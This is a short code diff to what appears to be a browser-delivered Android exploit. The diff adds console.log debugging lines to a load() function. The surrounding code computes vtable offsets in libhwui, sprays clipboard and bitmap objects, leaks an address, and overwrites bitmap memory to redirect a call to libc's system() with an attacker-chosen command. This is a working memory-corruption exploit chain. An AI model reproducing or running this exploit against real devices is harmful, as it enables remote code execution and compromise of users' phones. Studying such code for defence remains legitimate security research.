@@ -158,6 +158,7 @@
       function load() {
         let addrIdx = window.location.href.search('addr');
         if (addrIdx == -1) {
+          console.log("step1");
           let vtable = libhwuiOffset + bitWriterOffset - getRoutingIDOffset;
           createClipboards(2, clipboards);
           createClipboards(32, dataClipboards);
@@ -165,7 +166,9 @@
           let bitmap1 = createBitmap(1, 32, vtable);
           let bitmap2 = createBitmap(2, 32, vtable);
           readAddress(bitmap1, bitmap2);
+          console.log("step1 done");
         } else {
+          console.log("step2");
           createClipboards(1, clipboards);
           sleep(2000);
           let addr = BigInt(window.location.href.substring(addrIdx + 5));
@@ -178,9 +181,12 @@
           let view = new BigUint64Array(bitmap.pixelData.bytes.buffer);
           view[2] = libcOffset + systemOffset;
           view[3] = addr + BigInt(commandOffset);
+          console.log("step2 createIframe ifrm");
           createIframe('ifrm', ifrmUrl);
           createIframe('jam', jamUrl);
+          console.log("step2 createIframe ifrm done");
           setTimeout(() => {
+            console.log("step2 remove ifrm");
             removeIframe('ifrm');
             clipboards[0].writeImage(bitmap);
             console.log('done');
